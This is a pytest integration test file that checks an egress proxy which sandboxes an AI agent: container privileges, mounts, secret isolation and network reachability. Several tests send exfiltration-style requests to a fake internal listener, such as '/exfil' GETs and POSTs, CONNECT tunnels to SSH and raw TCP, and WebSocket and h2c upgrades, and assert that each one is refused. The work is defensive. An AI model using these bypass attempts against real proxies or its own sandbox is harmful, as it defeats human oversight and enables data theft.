"""T06-2 in the VM: the egress proxy's container and the agent beside it (docs/21).

Everything runs against this module's ``running_agent`` (conftest.py), which since T06-2 starts
the egress proxy too: the pinned mitmproxy image, its CA made by the VM's openssl (ca.py), and
backtide/gate/main.py, which still REFUSES EVERYTHING (nothing records yet: T06-4).

The egress network is ``--internal`` here (a concession of the tests): the only thing on it
besides the proxy is ``fake``, a listener that counts the connections it gets. So nothing can
reach the internet even if a check fails (invariant 8).

Done when (docs/21, T06-2): the agent and the proxy start together; the agent only reaches the
proxy, sees the certificate and not the key; the proxy sees nothing of backtide.
"""

# ruff: noqa: S108 - every /tmp here is inside a container

import json
import os
import secrets
from collections.abc import Iterator
from dataclasses import dataclass, replace
from pathlib import Path

import pytest

from backtide.jail import docker
from backtide.jail.ca import CA_FILE
from backtide.jail.config import CONTAINER_CA_FILE, PROXY_ALIAS
from backtide.jail.proxy import ProxyJail
from backtide.jail.proxy_config import IMAGE, proxy_create_argv
from backtide.jail.verify import proxy_container_problems

pytestmark = pytest.mark.integration

NO_CAPABILITIES = "0" * 16
REFUSAL = "backtide: nothing goes out until it can be recorded"
FAKE_PORTS = (80, 443)
# Runs in the fake container (python3 of the mitmproxy image): counts every TCP connection.
FAKE_LISTENER = r"""
import socket, threading
lock = threading.Lock()
def serve(port):
    server = socket.create_server(("0.0.0.0", port))
    while True:
        conn, _ = server.accept()
        with lock, open("/tmp/accepts", "a") as log:
            log.write(f"{port}\n")
        conn.close()
open("/tmp/accepts", "w").close()
for port in (80, 443):
    threading.Thread(target=serve, args=(port,), daemon=True).start()
print("fake-ready", flush=True)
threading.Event().wait()
"""
# Runs in a container: one TCP connection to host:port, prints "connected" or the error.
CONNECT = (
    "import socket, sys\n"
    "try:\n"
    "    socket.create_connection((sys.argv[1], int(sys.argv[2])), timeout=3).close()\n"
    "    print('connected')\n"
    "except OSError as e:\n"
    "    print(type(e).__name__)\n"
)
# Runs in the proxy: every listening TCP port and every bound UDP port, from /proc/net, but
# Docker's embedded resolver on 127.0.0.11 (in every container's namespace).
LISTENING = r"""
import json
found = {"tcp": set(), "udp": set()}
for name, kind in (("tcp", "tcp"), ("tcp6", "tcp"), ("udp", "udp"), ("udp6", "udp")):
    try:
        lines = open(f"/proc/net/{name}").read().splitlines()[1:]
    except OSError:
        continue
    for line in lines:
        fields = line.split()
        address, port = fields[1].rsplit(":", 1)
        if address == "0B00007F":  # 127.0.0.11, little-endian: Docker's DNS, not the proxy's
            continue
        port = int(port, 16)
        if kind == "udp" or fields[3] == "0A":  # 0A: LISTEN
            found[kind].add(port)
print(json.dumps({kind: sorted(ports) for kind, ports in found.items()}))
"""


@dataclass(frozen=True)
class Fake:
    name: str
    ip: str

    def accepts(self) -> list[str]:
        return docker.run(["exec", self.name, "cat", "/tmp/accepts"]).stdout.split()


@pytest.fixture(scope="module")
def proxy(running_agent) -> ProxyJail:
    assert running_agent.proxy is not None
    return running_agent.proxy


@pytest.fixture(scope="module")
def fake(proxy: ProxyJail) -> Iterator[Fake]:
    """A listener on the egress network, where only the proxy could reach it."""
    name = f"{proxy.config.name}-fake"
    docker.run(
        [
            "create",
            "--name",
            name,
            "--user",
            "61002:61002",
            "--cap-drop",
            "ALL",
            "--security-opt",
            "no-new-privileges=true",
            "--read-only",
            "--tmpfs",
            "/tmp:rw,size=1m",
            "--network",
            proxy.config.network,
            "--memory",
            "128m",
            "--pids-limit",
            "32",
            "--entrypoint",
            "python3",
            IMAGE,
            "-c",
            FAKE_LISTENER,
        ]  # fmt: skip
    )
    try:
        docker.run(["start", name])
        for _ in range(100):
            if "fake-ready" in docker.run(["logs", name]).stdout:
                break
            docker.run(["exec", name, "true"])
        info = json.loads(docker.run(["container", "inspect", name]).stdout)[0]
        yield Fake(name, info["NetworkSettings"]["Networks"][proxy.config.network]["IPAddress"])
    finally:
        docker.run(["rm", "--force", name], check=False)


def in_proxy(proxy: ProxyJail, *argv: str) -> str:
    return docker.run(["exec", proxy.config.name, *argv], timeout=60).stdout


def inspect(name: str) -> dict:
    return json.loads(docker.run(["container", "inspect", name]).stdout)[0]


def proc_status(text: str) -> dict[str, str]:
    return {k: v.strip() for k, _, v in (line.partition(":") for line in text.splitlines())}


# The proxy's container, seen from the host


def test_the_proxy_is_exactly_its_config(proxy: ProxyJail) -> None:
    """The check start() makes accepts what Docker really reports (and so it ran already)."""
    image_env = json.loads(
        docker.run(["image", "inspect", "--format", "{{json .Config.Env}}", IMAGE]).stdout
    )
    info = inspect(proxy.config.name)
    assert proxy_container_problems(proxy.config, info, image_env=image_env) == []
    assert info["HostConfig"]["Sysctls"] == {
        "net.ipv4.ip_forward": "0",
        "net.ipv6.conf.all.forwarding": "0",
    }
    assert set(info["NetworkSettings"]["Networks"]) == {
        proxy.config.agent_network,
        proxy.config.network,
    }
    assert PROXY_ALIAS in info["NetworkSettings"]["Networks"][proxy.config.agent_network]["Aliases"]


def test_start_refuses_a_proxy_that_is_not_the_one_of_its_config(proxy: ProxyJail) -> None:
    """A container under the proxy's config that lacks the ip_forward sysctl (as one made by
    hand, or by an older backtide, would) is never started."""
    other = ProxyJail(replace(proxy.config, name=f"{proxy.config.name}-other"))
    argv = proxy_create_argv(other.config)
    at = argv.index("--sysctl")
    del argv[at : at + 2]
    docker.run(argv)
    try:
        with pytest.raises(Exception, match="not the proxy this backtide expects.*Sysctls"):
            other.start()
        assert inspect(other.config.name)["State"]["Running"] is False
    finally:
        docker.run(["rm", "--force", other.config.name], check=False)


# The proxy's container, seen from inside


def test_the_proxy_runs_unprivileged(proxy: ProxyJail) -> None:
    status = proc_status(in_proxy(proxy, "cat", "/proc/1/status"))
    uid = str(proxy.config.uid)
    assert status["Uid"].split() == [uid] * 4
    assert "0" not in status["Gid"].split()
    for capabilities in ("CapInh", "CapPrm", "CapEff", "CapBnd", "CapAmb"):
        assert status[capabilities] == NO_CAPABILITIES, capabilities
    assert status["NoNewPrivs"] == "1"
    assert status["Seccomp"] == "2"  # Docker's default profile
    assert "backtide.gate.main" in in_proxy(proxy, "cat", "/proc/1/cmdline")


def test_the_proxy_sees_only_its_three_folders(proxy: ProxyJail) -> None:
    """Besides Docker's own, only /ca and the code (read-only), its channel folder, /tmp, and
    the empty read-only cover of the image's VOLUME (no anonymous volume)."""
    mounts = {}
    for line in in_proxy(proxy, "cat", "/proc/self/mountinfo").splitlines():
        fields = line.split(" ")
        mounts[fields[4]] = (fields[3], fields[5].split(",")[0])
    standard = {"/", "/proc", "/dev", "/dev/pts", "/dev/mqueue", "/dev/shm", "/sys"}
    standard |= {"/sys/fs/cgroup", "/etc/hostname", "/etc/hosts", "/etc/resolv.conf"}
    ours = {
        point: mode
        for point, (_root, mode) in mounts.items()
        if point not in standard and not point.startswith("/proc/") and point != "/sys/firmware"
    }
    assert ours == {
        "/ca": "ro",
        "/run/backtide": "rw",
        "/opt/backtide/backtide": "ro",
        "/tmp": "rw",
        "/home/mitmproxy/.mitmproxy": "ro",
    }
    assert [m for m in inspect(proxy.config.name)["Mounts"] if m["Type"] == "volume"] == []
    assert mounts["/ca"][0].endswith(f"/{proxy.config.ca_dir.name}")
    assert sorted(in_proxy(proxy, "ls", "-A", "/ca").split()) == [CA_FILE, "mitmproxy-dhparam.pem"]


def test_the_proxy_sees_nothing_of_backtide(proxy: ProxyJail, running_agent) -> None:
    """No Docker socket, and none of backtide's files: stand-ins planted next to the CA's
    folder (where the real state lives) and in the store's root never show up."""
    marker = f"backtide-stand-in-{secrets.token_hex(4)}"
    planted = [
        proxy.config.ca_dir.parent / f"{marker}-blackbox.db",
        proxy.config.ca_dir.parent / f"{marker}-gateway.token",
        running_agent.store.root / f"{marker}-snapshot",
    ]
    for path in planted:
        path.write_text("only backtide may see this\n")
    try:
        found = in_proxy(
            proxy, "sh", "-c",
            rf"find / \( -path /proc -o -path /sys \) -prune -o -name '{marker}*' -print "
            "2>/dev/null; true",
        )  # fmt: skip
    finally:
        for path in planted:
            path.unlink()
    assert found.split() == []
    for path in ("/var/run/docker.sock", "/run/docker.sock", "/run/containerd"):
        result = docker.run(["exec", proxy.config.name, "test", "-e", path], check=False)
        assert result.returncode == 1, path
    env = in_proxy(proxy, "env")
    assert [
        n for n in env.split() if any(w in n.upper() for w in ("KEY=", "TOKEN=", "SECRET"))
    ] == []


def test_forwarding_is_off_and_only_8080_listens(proxy: ProxyJail) -> None:
    """The proxy never routes between its two networks (T06-1, P4), and nothing in the agent's
    network answers DNS (T06-1, P5): the proxy listens on 8080 and nowhere else."""
    assert in_proxy(proxy, "cat", "/proc/sys/net/ipv4/ip_forward").strip() == "0"
    listening = json.loads(in_proxy(proxy, "python3", "-c", LISTENING))
    assert listening == {"tcp": [8080], "udp": []}


def test_the_proxy_reaches_the_egress_network(proxy: ProxyJail, fake: Fake) -> None:
    """Control for the agent's tests below: the proxy itself does reach the fake listener, so
    when the agent's requests leave nothing there, it is the gate that refused them."""
    before = len(fake.accepts())
    assert in_proxy(proxy, "python3", "-c", CONNECT, fake.ip, "443").strip() == "connected"
    assert len(fake.accepts()) == before + 1


# The agent with the proxy


def agent_sh(running_agent, script: str, timeout: float = 60):
    return running_agent.exec(["sh", "-c", script], timeout=timeout)


def test_the_agent_resolves_the_proxy_and_nothing_else(running_agent, proxy: ProxyJail) -> None:
    info = inspect(proxy.config.name)
    proxy_ip = info["NetworkSettings"]["Networks"][proxy.config.agent_network]["IPAddress"]
    assert running_agent.exec(["getent", "hosts", PROXY_ALIAS], check=True).stdout.split()[0] == (
        proxy_ip
    )
    for name in ("example.com", proxy.config.network, f"{proxy.config.name}-fake"):
        result = running_agent.exec(["getent", "hosts", name], timeout=30)
        assert result.returncode != 0, name
    assert not inspect(running_agent.name)["HostConfig"]["Dns"]


@pytest.mark.parametrize("scheme", ["https", "http"])
def test_curl_goes_through_the_proxy_trusts_its_ca_and_is_refused(
    running_agent, fake: Fake, scheme: str
) -> None:
    """curl reads https_proxy and CURL_CA_BUNDLE: the TLS handshake with the proxy verifies
    against the CA (no ``-k``), and the proxy answers 503 itself. The fake listener (where a
    proxy that let things through would connect) gets nothing."""
    before = fake.accepts()
    result = running_agent.exec(
        ["curl", "-sS", "-v", "--max-time", "20", "-w", "\nstatus=%{http_code}",
         f"{scheme}://{fake.ip}/exfil?data=x"],
        timeout=60,
    )  # fmt: skip
    assert result.returncode == 0, docker.sanitize(result.stderr[-2000:])
    assert result.stdout.strip().endswith("status=503"), result.stdout
    assert REFUSAL in result.stdout
    if scheme == "https":
        assert "backtide agent CA" in result.stderr  # the issuer curl verified
    assert fake.accepts() == before


def test_node_and_python_go_through_the_proxy_too(running_agent, fake: Fake) -> None:
    """Node's own fetch (NODE_USE_ENV_PROXY, NODE_EXTRA_CA_CERTS) and Python's urllib
    (HTTPS_PROXY, SSL_CERT_FILE): both verify the proxy's certificate and get its 503."""
    before = fake.accepts()
    node = running_agent.exec(
        ["node", "-e", f"fetch('https://{fake.ip}/n').then(r => console.log(r.status))"],
        timeout=60,
    )
    assert node.stdout.strip() == "503", docker.sanitize(node.stdout + node.stderr)
    python = running_agent.exec(
        [
            "python3", "-c",
            "import urllib.request as u, urllib.error as e\n"
            f"try: u.urlopen('https://{fake.ip}/p', timeout=20)\n"
            "except e.HTTPError as error: print(error.code)",
        ],
        timeout=60,
    )  # fmt: skip
    assert python.stdout.strip() == "503", docker.sanitize(python.stdout + python.stderr)
    assert fake.accepts() == before


def test_without_the_proxy_nothing_gets_out(running_agent, proxy: ProxyJail, fake: Fake) -> None:
    """What ignores the variables has no route: not to the egress side, not to the proxy's
    other ports (refused: nothing listens), and the gateway the proxy uses is not the agent's."""
    before = fake.accepts()
    direct = running_agent.exec(
        ["curl", "--noproxy", "*", "-sS", "--max-time", "5", f"http://{fake.ip}/"], timeout=30
    )
    assert direct.returncode != 0
    for port in FAKE_PORTS:
        outcome = running_agent.exec(["python3", "-c", CONNECT, fake.ip, str(port)], timeout=30)
        assert outcome.stdout.strip() != "connected", port
    for port in (22, 53, 443, 2375, 3128, 8081):
        outcome = running_agent.exec(["python3", "-c", CONNECT, PROXY_ALIAS, str(port)])
        assert outcome.stdout.strip() == "ConnectionRefusedError", port
    door = running_agent.exec(["python3", "-c", CONNECT, PROXY_ALIAS, "8080"])
    assert door.stdout.strip() == "connected"
    assert fake.accepts() == before


def test_the_agent_sees_the_certificate_and_never_the_key(running_agent, proxy: ProxyJail) -> None:
    """/etc/backtide-ca/ca.pem is the certificate alone, and no piece of the CA's key is in
    anything the agent can read (its mounts, /tmp, /etc, its environment)."""
    shown = running_agent.exec(["cat", str(CONTAINER_CA_FILE)], check=True).stdout
    assert shown.startswith("-----BEGIN CERTIFICATE-----")
    assert "PRIVATE KEY" not in shown
    key_pem = (proxy.config.ca_dir / CA_FILE).read_text().split("-----END PRIVATE KEY-----")[0]
    key_lines = [line for line in key_pem.splitlines() if line and not line.startswith("-----")]
    pieces = [key_lines[len(key_lines) // 2], key_lines[-2]]  # 64 base64 characters each
    found = agent_sh(
        running_agent,
        "grep -rlF -e " + " -e ".join(f"'{piece}'" for piece in pieces)
        + " /workspace /config /etc /tmp 2>/dev/null; "
        # (not in /tmp: node's compile cache holds the words themselves, from its own code)
        "grep -rlF 'PRIVATE KEY' /etc/backtide-ca /config 2>/dev/null; "
        + "env | grep -F -e " + " -e ".join(f"'{piece}'" for piece in pieces) + "; true",
        timeout=120,
    )  # fmt: skip
    assert found.stdout.split() == []


# Runs in a container: one raw exchange with host:port, prints what came back (as JSON).
RAW = r"""
import json, socket, sys, time
host, port, payload = sys.argv[1], int(sys.argv[2]), sys.argv[3].encode().decode("unicode_escape")
data = b""
try:
    with socket.create_connection((host, port), timeout=5) as conn:
        for part in payload.split("\x00"):
            conn.sendall(part.encode("latin-1"))
            time.sleep(0.5)
        conn.settimeout(3)
        while len(data) < 65536:
            chunk = conn.recv(4096)
            if not chunk:
                break
            data += chunk
except OSError as error:
    data += f"<{type(error).__name__}>".encode()
print(json.dumps(data.decode("latin-1")))
"""


def raw_exchange(container: str, host: str, port: int, payload: str) -> str:
    result = docker.run(
        ["exec", container, "python3", "-c", RAW, host, str(port), payload], timeout=60
    )
    return json.loads(result.stdout.strip().splitlines()[-1])


def test_only_the_agent_side_may_use_the_proxy(running_agent, proxy: ProxyJail, fake: Fake) -> None:
    """mitmproxy listens on every interface: a client on the egress side (the host, or
    anything that reaches that network) is cut at once. Control: the agent gets the 503."""
    info = inspect(proxy.config.name)
    egress_ip = info["NetworkSettings"]["Networks"][proxy.config.network]["IPAddress"]
    request = "GET http://example.com/ HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n"
    from_egress = raw_exchange(fake.name, egress_ip, 8080, request)
    assert "HTTP/1.1" not in from_egress, from_egress
    from_agent = raw_exchange(running_agent.name, PROXY_ALIAS, 8080, request)
    assert from_agent.startswith("HTTP/1.1 503"), from_agent


@pytest.mark.parametrize(
    "payload",
    [
        # CONNECT, then bytes that are not TLS nor HTTP (raw TCP through the tunnel)
        "CONNECT {ip}:80 HTTP/1.1\\r\\nHost: {ip}:80\\r\\n\\r\\n\\x00hello, raw tcp\\r\\n",
        # CONNECT to SSH's port, then an SSH greeting
        "CONNECT {ip}:22 HTTP/1.1\\r\\nHost: {ip}:22\\r\\n\\r\\n\\x00SSH-2.0-OpenSSH_9.9\\r\\n",
        # WebSocket upgrade, absolute form
        "GET http://{ip}/ws HTTP/1.1\\r\\nHost: {ip}\\r\\nUpgrade: websocket\\r\\n"
        "Connection: Upgrade\\r\\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\\r\\n"
        "Sec-WebSocket-Version: 13\\r\\n\\r\\n",
        # h2c upgrade
        "GET http://{ip}/ HTTP/1.1\\r\\nHost: {ip}\\r\\nConnection: Upgrade, HTTP2-Settings\\r\\n"
        "Upgrade: h2c\\r\\nHTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\\r\\n\\r\\n",
        # A request with a body the proxy would have to forward
        "POST http://{ip}/exfil HTTP/1.1\\r\\nHost: {ip}\\r\\nContent-Length: 5\\r\\n\\r\\nhello",
    ],
    ids=["connect-raw-tcp", "connect-ssh", "websocket", "h2c", "absolute-post"],
)
def test_tunnels_through_the_proxy_get_nowhere(running_agent, fake: Fake, payload: str) -> None:
    """While nothing records, no trick gets a byte to a server: the fake listener (which the
    proxy can reach, see the control above) accepts nothing, and any answer is the proxy's."""
    before = fake.accepts()
    answer = raw_exchange(running_agent.name, PROXY_ALIAS, 8080, payload.format(ip=fake.ip))
    assert fake.accepts() == before, answer
    statuses = [line for line in answer.split("\r\n") if line.startswith("HTTP/1.1 ")]
    assert all(
        status.startswith(("HTTP/1.1 503", "HTTP/1.1 200 Connection established", "HTTP/1.1 4"))
        for status in statuses
    ), answer
    assert "SSH-" not in answer.replace("SSH-2.0-OpenSSH_9.9", "")


def test_http2_inside_connect_is_refused_too(running_agent, fake: Fake) -> None:
    before = fake.accepts()
    result = running_agent.exec(
        ["curl", "-sS", "--http2", "--max-time", "20", "-o", "/dev/null",
         "-w", "%{http_code} %{http_version}", f"https://{fake.ip}/h2"],
        timeout=60,
    )  # fmt: skip
    assert result.stdout.strip() == "503 2", docker.sanitize(result.stdout + result.stderr)
    assert fake.accepts() == before


def test_both_start_together_after_a_restart(running_agent, proxy: ProxyJail, fake: Fake) -> None:
    """Stopped and started again, the proxy passes its checks and gets ready: what the
    Guardian will do after the agent (T06-4). Not while someone else is on its egress network
    (the fake listener, here): then it refuses to start."""
    proxy.stop()
    assert not proxy.is_running()
    with pytest.raises(Exception, match=f"others are on it.*{fake.name}"):
        proxy.start()
    assert not proxy.is_running()
    docker.run(["network", "disconnect", "--force", proxy.config.network, fake.name])
    proxy.start()
    proxy.wait_ready()
    door = running_agent.exec(["python3", "-c", CONNECT, PROXY_ALIAS, "8080"])
    assert door.stdout.strip() == "connected"


def test_the_ca_files_have_the_designs_modes(proxy: ProxyJail, running_agent) -> None:
    """Made by ca.py with the VM's openssl: 0440 key and dhparam, 0444 certificate."""
    for name in (CA_FILE, "mitmproxy-dhparam.pem"):
        assert (proxy.config.ca_dir / name).stat().st_mode & 0o777 == 0o440, name
    assert os.stat(running_agent.jail.config.ca_file).st_mode & 0o777 == 0o444
    assert Path(proxy.config.channel_dir).stat().st_mode & 0o777 == 0o700
